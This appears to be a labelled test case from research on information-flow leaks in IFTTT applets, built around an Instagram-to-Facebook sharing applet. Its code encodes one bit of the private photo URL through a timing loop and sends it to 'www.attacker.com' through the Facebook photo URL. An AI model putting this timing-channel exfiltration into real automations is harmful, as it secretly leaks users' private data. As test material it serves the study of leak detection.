//Maker: rsms
//Link2Applet: https://ifttt.com/applets/507p-automatically-share-your-instagrams-to-facebook
//Title of Applet:  Automatically share your Instagrams to Facebook
//Trigger service: Instagram
//Action service: Facebook
//Policy/Presence: Confidentiality of Instagram photos / NO  


url = lbl("Instagram.anyNewPhotoByYou.Url");

var res = "";
var stime = Date.now();
var a = lbl(1); 
if (url.charCodeAt(0) == 48) { a = lbl(10); while (a > 0) { a--; } }
else { a = lbl(0); while (a > 0) { a--; }  }
var etime = Date.now();
var b = etime-stime > 0 
if (b) { res += 0 }
else { res += 1 } 


attack = urll("www.attacker.com?" + res);
sink('FacebookPages.createPhotoPage', 'setPhotoUrl', attack);
